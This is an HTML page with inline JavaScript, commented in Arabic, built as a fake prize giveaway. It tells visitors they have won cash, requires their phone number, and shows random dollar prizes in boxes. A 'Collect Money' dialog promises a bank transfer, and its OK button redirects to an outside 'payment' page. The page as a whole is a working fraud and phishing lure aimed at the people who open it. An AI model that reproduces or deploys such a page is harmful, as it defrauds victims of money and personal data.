<body>
    <div class="container">
        <div class="header">
            <h1><i class="fas fa-crown"></i> For Our Valued Customers</h1>
            <p>You have been selected for a special prize! Choose two boxes to reveal your rewards.</p>
        </div>
        
        <div class="phone-input">
            <h3><i class="fas fa-phone"></i> Enter Your Phone Number</h3>
            <input type="tel" id="phoneNumber" placeholder="Enter your phone number here">
            <p>We need your phone number to contact you for prize delivery</p>
        </div>
            
        <div class="attempts-left" id="attemptsLeft">Attempts left: 2</div>
        
        <div class="prizes-container" id="prizesContainer">
            <!-- سيتم إضافة الصناديق ديناميكياً -->
        </div>
        
        <div class="result" id="result">
            <div>Select a box to reveal your prize!</div>
        </div>
        
        <div class="instructions">
            <h2><i class="fas fa-info-circle"></i> How to Play</h2>
            <ol>
                <li>Enter your phone number above</li>
                <li>You have 2 attempts to choose two boxes</li>
                <li>Click on any box to open it and see the prize inside</li>
                <li>The prize you will receive is the highest value from the two selected boxes</li>
                <li>Click "Collect Money" to claim your prize</li>
            </ol>
        </div>
        
        <button class="collect-button" id="collectButton">
            <span class="money-sticker">💰</span> 
            COLLECT MONEY
            <span class="money-sticker">💵</span>
        </button>
    </div>

    <!-- نافذة التأكيد -->
    <div class="confirmation-modal" id="confirmationModal">
        <div class="modal-content">
            <h2><i class="fas fa-check-circle"></i> Confirm Prize Collection</h2>
            <p>By clicking "OK", the following prize will be sent to your bank account:</p>
            <div class="result-amount" id="modalPrizeAmount">$0</div>
            <p>Make sure your phone number is correct for verification purposes.</p>
            <div class="modal-buttons">
                <button class="modal-btn confirm-btn" id="confirmButton">OK</button>
                <button class="modal-btn cancel-btn" id="cancelButton">Cancel</button>
            </div>
        </div>
    </div>

    <script>
        document.addEventListener('DOMContentLoaded', function() {
            const prizesContainer = document.getElementById('prizesContainer');
            const attemptsLeftElement = document.getElementById('attemptsLeft');
            const resultElement = document.getElementById('result');
            const collectButton = document.getElementById('collectButton');
            const phoneInput = document.getElementById('phoneNumber');
            const confirmationModal = document.getElementById('confirmationModal');
            const modalPrizeAmount = document.getElementById('modalPrizeAmount');
            const confirmButton = document.getElementById('confirmButton');
            const cancelButton = document.getElementById('cancelButton');
            
            let attemptsLeft = 2;
            let selectedPrizes = [];
            let gameEnded = false;
            let maxPrize = 0;
            
            // الجوائز المتاحة
            const prizes = [1000, 500, 100, 50, 10];
            
            // ترتيب الجوائز عشوائياً
            function shufflePrizes() {
                for (let i = prizes.length - 1; i > 0; i--) {
                    const j = Math.floor(Math.random() * (i + 1));
                    [prizes[i], prizes[j]] = [prizes[j], prizes[i]];
                }
            }
            
            // إنشاء الصناديق مع الجوائز العشوائية
            function createBoxes() {
                shufflePrizes();
                prizesContainer.innerHTML = '';
                
                prizes.forEach((prize, index) => {
                    const box = document.createElement('div');
                    box.className = 'prize-box';
                    box.setAttribute('data-prize', prize);
                    
                    box.innerHTML = `
                        <div class="prize-box-inner">
                            <div class="prize-box-front">
                                <i class="fas fa-gift"></i>
                                <h3>Box ${index + 1}</h3>
                            </div>
                            <div class="prize-box-back">
                                <h3>Prize</h3>
                                <div class="prize-amount">$${prize}</div>
                                <p>Congratulations!</p>
                            </div>
                        </div>
                    `;
                    
                    prizesContainer.appendChild(box);
                    
                    // إضافة حدث النقر للصندوق
                    box.addEventListener('click', () => {
                        if (gameEnded || box.classList.contains('flipped')) return;
                        
                        // التحقق من إدخال رقم الهاتف
                        if (!phoneInput.value.trim()) {
                            resultElement.innerHTML = `<div style="color:#ff6b6b">Please enter your phone number first!</div>`;
                            return;
                        }
                        
                        if (attemptsLeft > 0) {
                            // قلب الصندوق
                            box.classList.add('flipped');
                            
                            // الحصول على قيمة الجائزة
                            const prizeValue = parseInt(box.getAttribute('data-prize'));
                            selectedPrizes.push(prizeValue);
                            
                            // تقليل عدد المحاولات
                            attemptsLeft--;
                            attemptsLeftElement.textContent = `Attempts left: ${attemptsLeft}`;
                            
                            // عرض الجائزة
                            resultElement.innerHTML = `
                                <div>You won:</div>
                                <div class="result-amount">$${prizeValue}</div>
                                <div>${attemptsLeft > 0 ? 'Choose another box!' : 'No attempts left!'}</div>
                            `;
                            
                            // إذا انتهت المحاولات
                            if (attemptsLeft === 0) {
                                gameEnded = true;
                                maxPrize = Math.max(...selectedPrizes);
                                
                                setTimeout(() => {
                                    resultElement.innerHTML = `
                                        <div>Your attempts are over!</div>
                                        <div>The highest prize you won is:</div>
                                        <div class="result-amount">$${maxPrize}</div>
                                        <div>Congratulations!</div>
                                    `;
                                }, 1500);
                            }
                        }
                    });
                });
            }
            
            // إنشاء الصناديق أول مرة
            createBoxes();
            
            // زر تحصيل الأموال
            collectButton.addEventListener('click', () => {
                if (!phoneInput.value.trim()) {
                    resultElement.innerHTML = `<div style="color:#ff6b6b">Please enter your phone number to claim your prize!</div>`;
                    return;
                }
                
                if (selectedPrizes.length === 0) {
                    resultElement.innerHTML = `<div style="color:#ff6b6b">Please select at least one box first!</div>`;
                    return;
                }
                
                const prize = attemptsLeft === 0 ? maxPrize : Math.max(...selectedPrizes);
                
                // عرض نافذة التأكيد
                modalPrizeAmount.textContent = `$${prize}`;
                confirmationModal.style.display = 'flex';
            });
            
            // زر الموافقة في نافذة التأكيد
            confirmButton.addEventListener('click', () => {
                // توجيه المستخدم إلى صفحة الدفع
                window.location.href = 'https://payment0.github.io/pay/';
            });
            
            // زر الإلغاء في نافذة التأكيد
            cancelButton.addEventListener('click', () => {
                confirmationModal.style.display = 'none';
            });
        });
    </script>
</body>
</html>
